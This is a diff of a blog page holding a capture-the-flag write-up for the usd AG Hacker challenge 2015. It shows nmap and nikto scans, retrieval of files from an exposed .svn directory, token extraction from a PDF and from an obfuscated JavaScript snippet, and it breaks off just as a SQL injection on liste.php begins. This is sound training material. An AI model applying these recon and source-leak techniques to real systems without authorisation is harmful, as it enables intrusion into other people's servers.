@@ -1,18 +1,100 @@
-<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta charset=utf-8><title>usd AG Hacker challenge 2015 - Solutions - blog.dornea.nu</title><meta content="usd AG Hacker challenge 2015 - Solutions - blog.dornea.nu" property="title"><meta content="usd AG Hacker challenge 2015 - Solutions - blog.dornea.nu" property="og:title"><meta property="og:description" content="usd AG has announced a hacking challenge I have participated at. The target system was available at http://82.195.79.41/. Now let me sum up thg steps that have been required in order to get all 6 tokens.
-# <!-- collapse=True --> import pandas as pd import sqlite3 import binascii Scratch the surface Let&rsquo;s first conduct a nmap scan to see which ports are open.
-%%bash nmap -A -T4 82.195.79.41 Starting Nmap 6."><meta property="og:type" content="article"><meta property="og:url" content="http://blog.dornea.nu/2015/03/18/usd-ag-hacker-challenge-2015-solutions/"><meta property="article:published_time" content="2015-03-18T00:00:00+00:00"><meta property="article:modified_time" content="2015-03-18T00:00:00+00:00"><meta name=generator content="Hugo 0.75.1"><link href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:400,600" rel=stylesheet><style type=text/css>:root{--main-color: #8C6056;--secondary-color: #AFD5AA;--logo-text-color: #fff;--body-text-color: #3d3d3d;--heading-text-color: #383838;--background-color: #fff}</style><link href=http://blog.dornea.nu/css/tachyons.min.css rel=stylesheet><link href=http://blog.dornea.nu/css/styles.css rel=stylesheet><link rel=icon href=http://blog.dornea.nu/favicon.ico type=image/x-icon><link href=http://blog.dornea.nu/feed.xml rel=alternate type=application/atom+xml title=blog.dornea.nu></head><body class=global-font><nav class="flex-ns justify-between border-box pa3 pl3-l pr2-l mt1 mt0-ns" id=navbar><div class=flex><a class="f4 fw6 ttu no-underline dim bg-main-color pv1 ph2 br2" id=site-title href=http://blog.dornea.nu/ title=Home>blog.dornea.nu</a></div><div class="flex-ns mt2 mt0-ns pv1"><a class="link dim dark-gray f6 dib mr2 mr3-l ttu tracked" href=http://blog.dornea.nu/ title=Home>Home</a>
-<a class="link dim dark-gray f6 dib mr2 mr3-l ttu tracked" href=http://dornea.nu title=About>About</a>
-<a class="link dim dark-gray f6 dib mr2 mr3-l ttu tracked" href=http://blog.dornea.nu/tags title=Tags>Tags</a>
-<a class="link dim dark-gray f6 dib mr2 mr3-l ttu tracked" href=https://brainfck.org title=Zettelkasten>Zettelkasten</a>
-<a class="link dim dark-gray f6 dib mr2 mr3-l ttu tracked" href=https://brainfck.org/bookmarks.html title=Bookmarks>Bookmarks</a>
-<a class="link dim dark-gray f6 dib mr2 mr3-l ttu tracked" href=https://brainfck.org/bib.html title=Books>Books</a>
-<a class="link dim dark-gray f6 dib mr2 mr3-l ttu tracked" href=http://blog.dornea.nu/notes title=Notes>Notes</a></div></nav><main class="center mv4 content-width ph3"><div class="f3 fw6 heading-color heading-font post-title">usd AG Hacker challenge 2015 - Solutions</div><p class="silver f6 mt1 mb4 post-meta"><time>18 Mar 2015</time>
-|
-tags: [ <a href=http://blog.dornea.nu/tags/android class="link silver">android</a> <a href=http://blog.dornea.nu/tags/hacking class="link silver">hacking</a> <a href=http://blog.dornea.nu/tags/networking class="link silver">networking</a> <a href=http://blog.dornea.nu/tags/security class="link silver">security</a> <a href=http://blog.dornea.nu/tags/ipython class="link silver">ipython</a> <a href=http://blog.dornea.nu/tags/ctf class="link silver">ctf</a> <a href=http://blog.dornea.nu/tags/usd class="link silver">usd</a> <a href=http://blog.dornea.nu/tags/wargames class="link silver">wargames</a> ]</p><div class="lh-copy post-content"><p><a href=https://www.usd.de>usd AG</a> has announced a <a href=https://www.usd.de/usd-hackertag-2015/>hacking challenge</a> I have participated at. The target system was available at http://82.195.79.41/. Now let me sum up thg steps that have been required in order to get <strong>all</strong> 6 tokens.</p><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#999;font-style:italic># &lt;!-- collapse=True --&gt;</span>
-<span style=color:#6ab825;font-weight:700>import</span> <span style=color:#447fcf;text-decoration:underline>pandas</span> <span style=color:#6ab825;font-weight:700>as</span> <span style=color:#447fcf;text-decoration:underline>pd</span>
-<span style=color:#6ab825;font-weight:700>import</span> <span style=color:#447fcf;text-decoration:underline>sqlite3</span>
-<span style=color:#6ab825;font-weight:700>import</span> <span style=color:#447fcf;text-decoration:underline>binascii</span>
-</code></pre></div><h2 id=scratch-the-surface>Scratch the surface</h2><p>Let&rsquo;s first conduct a <strong>nmap</strong> scan to see which ports are open.</p><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>%%bash
+<!doctype html>
+<html lang="en">
+<head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<meta content='text/html; charset=utf-8' http-equiv='content-type' />
+
+  <title>usd AG Hacker challenge 2015 - Solutions - blog.dornea.nu</title>
+  <meta content='usd AG Hacker challenge 2015 - Solutions - blog.dornea.nu' property='title' />
+  <meta content='usd AG Hacker challenge 2015 - Solutions - blog.dornea.nu' property='og:title' />
+
+
+<meta property="og:description" content="usd AG has announced a hacking challenge I have participated at. The target system was available at http://82.195.79.41/. Now let me sum up thg steps that have been required in order to get all 6 tokens.
+# &lt;!-- collapse=True --&gt; import pandas as pd import sqlite3 import binascii Scratch the surface Let&rsquo;s first conduct a nmap scan to see which ports are open.
+%%bash nmap -A -T4 82.195.79.41 Starting Nmap 6." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://blog.dornea.nu/2015/03/18/usd-ag-hacker-challenge-2015-solutions/" />
+
+
+<meta property="article:published_time" content="2015-03-18T00:00:00&#43;00:00"/>
+
+<meta property="article:modified_time" content="2015-03-18T00:00:00&#43;00:00"/>
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hugo 0.75.1" />
+
+<link href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:400,600" rel="stylesheet">
+<style type="text/css">/*https://coolors.co/afd5aa-f0f2ef-a69f98-3d3d3d-8c6057*/
+:root {
+  --main-color: #8C6056; 
+  --secondary-color: #AFD5AA;
+  --logo-text-color: #fff;
+  --body-text-color: #3d3d3d;
+  --heading-text-color: #383838;
+  --background-color: #fff;
+}</style>
+<link href='http://blog.dornea.nu/css/tachyons.min.css' rel="stylesheet">
+<link href='http://blog.dornea.nu/css/styles.css' rel="stylesheet">
+
+
+<link rel="icon" 
+ 
+  href='http://blog.dornea.nu/favicon.ico'
+
+type="image/x-icon"/>
+
+<link href='http://blog.dornea.nu/feed.xml' rel="alternate" type="application/atom+xml" title="blog.dornea.nu" />
+</head>
+<body class="global-font">
+  <nav class=" flex-ns justify-between border-box pa3 pl3-l pr2-l mt1 mt0-ns" id="navbar">
+  <div class="flex">
+    <a class="f4 fw6 ttu no-underline dim bg-main-color pv1 ph2 br2" id="site-title" href='http://blog.dornea.nu/' title="Home">blog.dornea.nu</a>
+  </div>
+  
+  <div class=" flex-ns mt2 mt0-ns pv1">
+    
+      <a class="link dim dark-gray f6 dib mr2 mr3-l ttu tracked" href='http://blog.dornea.nu/' title="Home">Home</a>
+    
+      <a class="link dim dark-gray f6 dib mr2 mr3-l ttu tracked" href='http://dornea.nu' title="About">About</a>
+    
+      <a class="link dim dark-gray f6 dib mr2 mr3-l ttu tracked" href='http://blog.dornea.nu/tags' title="Tags">Tags</a>
+    
+      <a class="link dim dark-gray f6 dib mr2 mr3-l ttu tracked" href='https://brainfck.org' title="Zettelkasten">Zettelkasten</a>
+    
+      <a class="link dim dark-gray f6 dib mr2 mr3-l ttu tracked" href='https://brainfck.org/bookmarks.html' title="Bookmarks">Bookmarks</a>
+    
+      <a class="link dim dark-gray f6 dib mr2 mr3-l ttu tracked" href='https://brainfck.org/bib.html' title="Books">Books</a>
+    
+      <a class="link dim dark-gray f6 dib mr2 mr3-l ttu tracked" href='http://blog.dornea.nu/notes' title="Notes">Notes</a>
+    
+  </div>
+  
+</nav>
+  
+<main class="center mv4 content-width ph3">
+  <div class="f3 fw6 heading-color heading-font post-title">usd AG Hacker challenge 2015 - Solutions</div>
+  <p class="silver f6 mt1 mb4 post-meta">
+    <time>18 Mar 2015</time> 
+     | 
+    
+    
+    tags: [ <a href='http://blog.dornea.nu/tags/android' class="link silver">android</a> <a href='http://blog.dornea.nu/tags/hacking' class="link silver">hacking</a> <a href='http://blog.dornea.nu/tags/networking' class="link silver">networking</a> <a href='http://blog.dornea.nu/tags/security' class="link silver">security</a> <a href='http://blog.dornea.nu/tags/ipython' class="link silver">ipython</a> <a href='http://blog.dornea.nu/tags/ctf' class="link silver">ctf</a> <a href='http://blog.dornea.nu/tags/usd' class="link silver">usd</a> <a href='http://blog.dornea.nu/tags/wargames' class="link silver">wargames</a>  ]
+    
+  </p>
+  <div class="lh-copy post-content"><p><a href="https://www.usd.de">usd AG</a> has announced a <a href="https://www.usd.de/usd-hackertag-2015/">hacking challenge</a> I have participated at. The target system was available at http://82.195.79.41/. Now let me sum up thg steps that have been required in order to get <strong>all</strong> 6 tokens.</p>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#999;font-style:italic"># &lt;!-- collapse=True --&gt;</span>
+<span style="color:#6ab825;font-weight:bold">import</span> <span style="color:#447fcf;text-decoration:underline">pandas</span> <span style="color:#6ab825;font-weight:bold">as</span> <span style="color:#447fcf;text-decoration:underline">pd</span>
+<span style="color:#6ab825;font-weight:bold">import</span> <span style="color:#447fcf;text-decoration:underline">sqlite3</span>
+<span style="color:#6ab825;font-weight:bold">import</span> <span style="color:#447fcf;text-decoration:underline">binascii</span>
+</code></pre></div><h2 id="scratch-the-surface">Scratch the surface</h2>
+<p>Let&rsquo;s first conduct a <strong>nmap</strong> scan to see which ports are open.</p>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">%%bash
 nmap -A -T4 82.195.79.41
 </code></pre></div><pre><code>Starting Nmap 6.47 ( http://nmap.org ) at 2015-03-18 20:57 CET
 Nmap scan report for 82.195.79.41
@@ -32,7 +114,9 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 11.70 seconds
-</code></pre><p>So we have <strong>2 disallowed entries</strong>. Let&rsquo;s have a look:</p><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#a61717;background-color:#e3d2d2>!</span>curl http://<span style=color:#3677a9>82.195</span>.<span style=color:#3677a9>79.41</span>//no/one/will/ever/know/
+</code></pre>
+<p>So we have <strong>2 disallowed entries</strong>. Let&rsquo;s have a look:</p>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#a61717;background-color:#e3d2d2">!</span>curl http://<span style="color:#3677a9">82.195</span>.<span style="color:#3677a9">79.41</span>//no/one/will/ever/know/
 </code></pre></div><pre><code>&lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 3.2 Final//EN&quot;&gt;
 &lt;html&gt;
  &lt;head&gt;
@@ -46,9 +130,14 @@ Nmap done: 1 IP address (1 host up) scanned in 11.70 seconds
 &lt;tr&gt;&lt;th colspan=&quot;5&quot;&gt;&lt;hr&gt;&lt;/th&gt;&lt;/tr&gt;
 &lt;/table&gt;
 &lt;/body&gt;&lt;/html&gt;
-</code></pre><h3 id=first-token>First token</h3><p>If you pay attention you&rsquo;ll see a <strong>secret.txt</strong> in that directory:</p><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#a61717;background-color:#e3d2d2>!</span>curl http://<span style=color:#3677a9>82.195</span>.<span style=color:#3677a9>79.41</span>//no/one/will/ever/know/secret.txt
+</code></pre>
+<h3 id="first-token">First token</h3>
+<p>If you pay attention you&rsquo;ll see a <strong>secret.txt</strong> in that directory:</p>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#a61717;background-color:#e3d2d2">!</span>curl http://<span style="color:#3677a9">82.195</span>.<span style="color:#3677a9">79.41</span>//no/one/will/ever/know/secret.txt
 </code></pre></div><pre><code>Token: 928191
-</code></pre><p>Bingo! Ok what about <code>~freddy</code>:</p><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#a61717;background-color:#e3d2d2>!</span>curl http://<span style=color:#3677a9>82.195</span>.<span style=color:#3677a9>79.41</span>/~freddy/
+</code></pre>
+<p>Bingo! Ok what about <code>~freddy</code>:</p>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#a61717;background-color:#e3d2d2">!</span>curl http://<span style="color:#3677a9">82.195</span>.<span style="color:#3677a9">79.41</span>/~freddy/
 </code></pre></div><pre><code>&lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 3.2 Final//EN&quot;&gt;
 &lt;html&gt;
  &lt;head&gt;
@@ -61,7 +150,11 @@ Nmap done: 1 IP address (1 host up) scanned in 11.70 seconds
 &lt;tr&gt;&lt;th colspan=&quot;5&quot;&gt;&lt;hr&gt;&lt;/th&gt;&lt;/tr&gt;
 &lt;/table&gt;
 &lt;/body&gt;&lt;/html&gt;
-</code></pre><p>OK, nothing to see here. <strong>BUT</strong>: We keep in mind that <strong>freddy</strong> is probably a local username.</p><h2 id=2nd-token>2nd token</h2><p>The nmap results suggested that there is a HTTPD on port 80. Let&rsquo;s see what <strong>nikto</strong> finds:</p><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#a61717;background-color:#e3d2d2>!</span>nikto -host http://<span style=color:#3677a9>82.195</span>.<span style=color:#3677a9>79.41</span>/ -C <span style=color:#24909d>all</span>
+</code></pre>
+<p>OK, nothing to see here. <strong>BUT</strong>: We keep in mind that <strong>freddy</strong> is probably a local username.</p>
+<h2 id="2nd-token">2nd token</h2>
+<p>The nmap results suggested that there is a HTTPD on port 80. Let&rsquo;s see what <strong>nikto</strong> finds:</p>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#a61717;background-color:#e3d2d2">!</span>nikto -host http://<span style="color:#3677a9">82.195</span>.<span style="color:#3677a9">79.41</span>/ -C <span style="color:#24909d">all</span>
 </code></pre></div><pre><code>- Nikto v2.1.5
 ---------------------------------------------------------------------------
 + Target IP:          82.195.79.41
@@ -84,9 +177,13 @@ Nmap done: 1 IP address (1 host up) scanned in 11.70 seconds
 + End Time:           2015-03-18 20:19:17 (GMT1) (717 seconds)
 ---------------------------------------------------------------------------
 + 1 host(s) tested
-</code></pre><p>Besides thet <em>robots.txt</em> entries <code>.svn</code> looks very interesting. Let&rsquo;s have a closer look:</p><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python>con = sqlite3.connect(<span style=color:#ed9d13>&#34;wc.db&#34;</span>)
-</code></pre></div><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python>pd.read_sql(<span style=color:#ed9d13>&#34;SELECT local_relpath, checksum FROM NODES&#34;</span>, con)
-</code></pre></div><p>Obviously there is a <code>download.php</code> which we can retrieve from the SVN repo. Using the <a href=http://pen-testing.sans.org/blog/2012/12/06/all-your-svn-are-belong-to-us>tutorial</a> one can access the files inside the repository very easily:</p><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#a61717;background-color:#e3d2d2>!</span>curl http://<span style=color:#3677a9>82.195</span>.<span style=color:#3677a9>79.41</span>/.svn/pristine/<span style=color:#3677a9>71</span>/<span style=color:#3677a9>71</span>d7c4326159dff73464c31c8b8f3ee0aad3a805.svn-base
+</code></pre>
+<p>Besides thet <em>robots.txt</em> entries <code>.svn</code> looks very interesting. Let&rsquo;s have a closer look:</p>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">con = sqlite3.connect(<span style="color:#ed9d13">&#34;wc.db&#34;</span>)
+</code></pre></div><div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">pd.read_sql(<span style="color:#ed9d13">&#34;SELECT local_relpath, checksum FROM NODES&#34;</span>, con)
+</code></pre></div><!-- raw HTML omitted -->
+<p>Obviously there is a <code>download.php</code> which we can retrieve from the SVN repo. Using the <a href="http://pen-testing.sans.org/blog/2012/12/06/all-your-svn-are-belong-to-us">tutorial</a> one can access the files inside the repository very easily:</p>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#a61717;background-color:#e3d2d2">!</span>curl http://<span style="color:#3677a9">82.195</span>.<span style="color:#3677a9">79.41</span>/.svn/pristine/<span style="color:#3677a9">71</span>/<span style="color:#3677a9">71</span>d7c4326159dff73464c31c8b8f3ee0aad3a805.svn-base
 </code></pre></div><pre><code>&lt;?php
 include &quot;src/header.php&quot;;
 // Todo: Challenge fuer Token 102342 bauen.
@@ -102,9 +199,21 @@ echo &quot;&lt;/div&gt;&lt;/div&gt;&quot;;
 include &quot;src/menu.php&quot;;
 include &quot;src/footer.php&quot;;
 ?&gt;
-</code></pre><p>There is this line:</p><blockquote><p>Todo: Challenge fuer <strong>Token 102342</strong> bauen.</p></blockquote><h2 id=3rd-token>3rd Token</h2><p>Now let&rsquo;s have a look at the PDF under http://82.195.79.41/download.php.</p><p><img src=http://dl.dornea.nu/img/2015/hackertag/9ca3a31f6400a2bf414ad3802d296cd3.png alt=hackertag></p><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#a61717;background-color:#e3d2d2>!</span><span style=color:#24909d>file</span> usd_Hackertag_2015.pdf
+</code></pre>
+<p>There is this line:</p>
+<blockquote>
+<p>Todo: Challenge fuer <strong>Token 102342</strong> bauen.</p>
+</blockquote>
+<h2 id="3rd-token">3rd Token</h2>
+<p>Now let&rsquo;s have a look at the PDF under http://82.195.79.41/download.php.</p>
+<p><img src="http://dl.dornea.nu/img/2015/hackertag/9ca3a31f6400a2bf414ad3802d296cd3.png" alt="hackertag"></p>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#a61717;background-color:#e3d2d2">!</span><span style="color:#24909d">file</span> usd_Hackertag_2015.pdf
 </code></pre></div><pre><code>usd_Hackertag_2015.pdf: PDF document, version 1.3
-</code></pre><p>When you look at it (PDF viewer) nothing special about it.</p><p><img src=http://dl.dornea.nu/img/2015/hackertag/c304c9040deae8ee416f3e4f8a8f7802.png alt=hackertag></p><p>Let&rsquo;s extract all available strings:</p><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#a61717;background-color:#e3d2d2>!</span>strings usd_Hackertag_2015.pdf | tail -n <span style=color:#3677a9>20</span>
+</code></pre>
+<p>When you look at it (PDF viewer) nothing special about it.</p>
+<p><img src="http://dl.dornea.nu/img/2015/hackertag/c304c9040deae8ee416f3e4f8a8f7802.png" alt="hackertag"></p>
+<p>Let&rsquo;s extract all available strings:</p>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#a61717;background-color:#e3d2d2">!</span>strings usd_Hackertag_2015.pdf | tail -n <span style="color:#3677a9">20</span>
 </code></pre></div><pre><code>/ModDate (D:20150220100358+01'00')
 /Producer (Adobe PDF library 10.01)
 /Title (usd Hackertag 2015)
@@ -125,24 +234,42 @@ trailer
 startxref
 651378
 %%EOF
-</code></pre><p>Again bingo: <strong>Token: 338912</strong></p><h2 id=4th-token>4th Token</h2><p>Now let&rsquo;s have a look at the main <a href=http://82.195.79.41/>web-page</a>. Somewhere you&rsquo;ll see this line:</p><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>&lt;script type=&#34;text/javascript&#34; src=&#34;http://82.195.79.41/js/jquery/jquery.js&#34;&gt;&lt;/script&gt;
-</code></pre></div><p>But wait a sec. JQuery? That sounds suspicious.</p><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#a61717;background-color:#e3d2d2>!</span>curl http://<span style=color:#3677a9>82.195</span>.<span style=color:#3677a9>79.41</span>/js/jquery/jquery.js
+</code></pre>
+<p>Again bingo: <strong>Token: 338912</strong></p>
+<h2 id="4th-token">4th Token</h2>
+<p>Now let&rsquo;s have a look at the main <a href="http://82.195.79.41/">web-page</a>. Somewhere you&rsquo;ll see this line:</p>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">&lt;script type=&#34;text/javascript&#34; src=&#34;http://82.195.79.41/js/jquery/jquery.js&#34;&gt;&lt;/script&gt;
+</code></pre></div><p>But wait a sec. JQuery? That sounds suspicious.</p>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#a61717;background-color:#e3d2d2">!</span>curl http://<span style="color:#3677a9">82.195</span>.<span style="color:#3677a9">79.41</span>/js/jquery/jquery.js
 </code></pre></div><pre><code>eval(String.fromCharCode(105, 102, 32, 40, 119, 105, 110, 100, 111, 119, 46, 108, 111, 99, 97, 116, 105, 111, 110, 46, 104, 111, 115, 116, 110, 97, 109, 101, 32, 61, 61, 32, 34, 49, 50, 55, 46, 48, 46, 48, 46, 49, 34, 41, 32, 123, 10, 118, 97, 114, 32, 95, 48, 120, 98, 55, 57, 97, 61, 91, 34, 92, 120, 53, 55, 92, 120, 54, 57, 92, 120, 54, 67, 92, 120, 54, 67, 92, 120, 54, 66, 92, 120, 54, 70, 92, 120, 54, 68, 92, 120, 54, 68, 92, 120, 54, 53, 92, 120, 54, 69, 92, 120, 50, 48, 92, 120, 55, 65, 92, 120, 55, 53, 92, 120, 55, 50, 92, 120, 70, 67, 92, 120, 54, 51, 92, 120, 54, 66, 92, 120, 50, 48, 92, 120, 54, 54, 92, 120, 55, 50, 92, 120, 54, 53, 92, 120, 54, 52, 92, 120, 54, 52, 92, 120, 55, 57, 92, 120, 50, 69, 92, 120, 50, 48, 92, 120, 52, 52, 92, 120, 54, 53, 92, 120, 55, 50, 92, 120, 50, 48, 92, 120, 54, 55, 92, 120, 54, 53, 92, 120, 54, 56, 92, 120, 54, 53, 92, 120, 54, 57, 92, 120, 54, 68, 92, 120, 54, 53, 92, 120, 50, 48, 92, 120, 53, 52, 92, 120, 54, 70, 92, 120, 54, 66, 92, 120, 54, 53, 92, 120, 54, 69, 92, 120, 50, 48, 92, 120, 54, 67, 92, 120, 54, 49, 92, 120, 55, 53, 92, 120, 55, 52, 92, 120, 54, 53, 92, 120, 55, 52, 92, 120, 51, 65, 92, 120, 50, 48, 92, 120, 51, 52, 92, 120, 51, 49, 92, 120, 51, 55, 92, 120, 51, 56, 92, 120, 51, 53, 92, 120, 51, 53, 34, 93, 59, 97, 108, 101, 114, 116, 40, 95, 48, 120, 98, 55, 57, 97, 91, 48, 93, 41, 59, 10, 125));
-</code></pre><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python>char_codes = <span style=color:#a61717;background-color:#e3d2d2>!</span>curl http://<span style=color:#3677a9>82.195</span>.<span style=color:#3677a9>79.41</span>/js/jquery/jquery.js
-</code></pre></div><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#999;font-style:italic># Convert char codes to string</span>
-char_codes = char_codes[<span style=color:#3677a9>5</span>][<span style=color:#3677a9>25</span>:-<span style=color:#3677a9>3</span>].split(<span style=color:#ed9d13>&#39;,&#39;</span>)
-string_message = <span style=color:#ed9d13>&#39;&#39;</span>.join(<span style=color:#24909d>chr</span>(<span style=color:#24909d>int</span>(i)) <span style=color:#6ab825;font-weight:700>for</span> i <span style=color:#6ab825;font-weight:700>in</span> char_codes)
+</code></pre>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">char_codes = <span style="color:#a61717;background-color:#e3d2d2">!</span>curl http://<span style="color:#3677a9">82.195</span>.<span style="color:#3677a9">79.41</span>/js/jquery/jquery.js
+</code></pre></div><div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#999;font-style:italic"># Convert char codes to string</span>
+char_codes = char_codes[<span style="color:#3677a9">5</span>][<span style="color:#3677a9">25</span>:-<span style="color:#3677a9">3</span>].split(<span style="color:#ed9d13">&#39;,&#39;</span>)
+string_message = <span style="color:#ed9d13">&#39;&#39;</span>.join(<span style="color:#24909d">chr</span>(<span style="color:#24909d">int</span>(i)) <span style="color:#6ab825;font-weight:bold">for</span> i <span style="color:#6ab825;font-weight:bold">in</span> char_codes)
 string_message
 </code></pre></div><pre><code>'if (window.location.hostname == &quot;127.0.0.1&quot;) {\nvar _0xb79a=[&quot;\\x57\\x69\\x6C\\x6C\\x6B\\x6F\\x6D\\x6D\\x65\\x6E\\x20\\x7A\\x75\\x72\\xFC\\x63\\x6B\\x20\\x66\\x72\\x65\\x64\\x64\\x79\\x2E\\x20\\x44\\x65\\x72\\x20\\x67\\x65\\x68\\x65\\x69\\x6D\\x65\\x20\\x54\\x6F\\x6B\\x65\\x6E\\x20\\x6C\\x61\\x75\\x74\\x65\\x74\\x3A\\x20\\x34\\x31\\x37\\x38\\x35\\x35&quot;];alert(_0xb79a[0]);\n}'
-</code></pre><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#999;font-style:italic># Decode hex string to ascii</span>
-hex_code = string_message[<span style=color:#3677a9>61</span>:-<span style=color:#3677a9>23</span>].replace(<span style=color:#ed9d13>&#39;</span><span style=color:#ed9d13>\\</span><span style=color:#ed9d13>x&#39;</span>, <span style=color:#ed9d13>&#39;&#39;</span>)
+</code></pre>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#999;font-style:italic"># Decode hex string to ascii</span>
+hex_code = string_message[<span style="color:#3677a9">61</span>:-<span style="color:#3677a9">23</span>].replace(<span style="color:#ed9d13">&#39;</span><span style="color:#ed9d13">\\</span><span style="color:#ed9d13">x&#39;</span>, <span style="color:#ed9d13">&#39;&#39;</span>)
 binascii.unhexlify(hex_code)
 </code></pre></div><pre><code>b'Willkommen zur\xfcck freddy. Der geheime Token lautet: 417855'
-</code></pre><p>Our found token: <strong>417855</strong></p><h2 id=5th-token>5th Token</h2><p>I must say this part of the challenge was the most &ldquo;challenging&rdquo; one. The found vulnerability was actually obvious but it took me to long to exploit it :D But first a short introduction to the vulnerability itself.</p><p>There was this link http://82.195.79.41/liste.php?id=1 which caught my attention from the beginning.</p><p><img src=http://dl.dornea.nu/img/2015/hackertag/0b0663206b0bb77ffcb484f606c39936.png alt=hackertag></p><p>The first thing I did:</p><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#a61717;background-color:#e3d2d2>!</span>curl <span style=color:#ed9d13>&#34;http://82.195.79.41/liste.php?id=1&#39;&#34;</span> <span style=color:#3677a9>2</span>&gt; /dev/null | tail -n <span style=color:#3677a9>1</span>
+</code></pre>
+<p>Our found token: <strong>417855</strong></p>
+<h2 id="5th-token">5th Token</h2>
+<p>I must say this part of the challenge was the most &ldquo;challenging&rdquo; one. The found vulnerability was actually obvious but it took me to long to exploit it :D But first a short introduction to the vulnerability itself.</p>
+<p>There was this link http://82.195.79.41/liste.php?id=1 which caught my attention from the beginning.</p>
+<p><img src="http://dl.dornea.nu/img/2015/hackertag/0b0663206b0bb77ffcb484f606c39936.png" alt="hackertag"></p>
+<p>The first thing I did:</p>
